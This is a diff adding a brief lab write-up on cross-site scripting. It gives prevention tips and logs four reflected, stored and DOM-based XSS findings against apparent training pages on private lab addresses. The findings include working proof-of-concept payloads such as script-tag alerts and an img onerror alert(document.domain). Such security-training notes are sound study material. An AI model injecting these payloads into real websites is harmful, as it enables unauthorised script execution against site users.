@@ -1,0 +1,63 @@
+𝗖𝗿𝗼𝘀𝘀-𝘀𝗶𝘁𝗲 𝗦𝗰𝗿𝗶𝗽𝘁𝗶𝗻𝗴
+ 
+        Cross-site Scripting (XSS) is a security vulnerability usually found in websites and/or web applications that accept user input. Examples of these include search engines, login forms, message boards and comment boxes
+       
+𝗽𝗿𝗲𝘃𝗲𝗻𝘁 𝗫𝗦𝗦 𝗮𝘁𝘁𝗮𝗰𝗸𝘀
+     
+         *Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+         *Encode data on output. ...
+         *Use appropriate response headers. ...
+         *Content Security Policy.
+         
+         𝗢𝗰𝗰𝘂𝗿𝗿𝗲𝗻𝗰𝗲
+             
+             Occurrence 1
+             Url: http://10.10.121.251/vulnerabilities/xss_r/
+             Parameter: Whats you name ?
+             Payload:<script>alert(“hello”)</script>
+             Images: 
+    
+                   https://im.ge/i/FD1ufF
+                   
+                   
+                   https://im.ge/i/FD1159
+                   
+            Occurrence 2
+             Url: http://10.10.165.249/vulnerabilities/xss_r/
+             Parameter: Whats you name ?
+             Payload: <Script>alert(“Hacked”)</Script>
+             Images:       
+             
+                  https://im.ge/i/FD1dM8
+                  
+                  https://im.ge/i/FD1sxM
+                  
+                  https://im.ge/i/FD1aJY
+                  
+                  
+               
+                      
+            Occurrence 3
+             Url: http://10.10.165.249/vulnerabilities/xss_s/
+             Parameter: Message
+             Payload: <img src=x onerror=alert(document.domain)>
+             Images:
+             
+                https://im.ge/i/FD1huq
+                
+                https://im.ge/i/FD1mxm
+                
+                
+             
+             Occurrence 4
+             Url: http://10.10.165.249/vulnerabilities/xss_d/
+             Parameter: Search bar
+             Payload:http://10.10.165.249/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
+             Images:
+             
+                https://im.ge/i/FD1cny
+                
+                
+                https://im.ge/i/FD1V9K
+               
+                
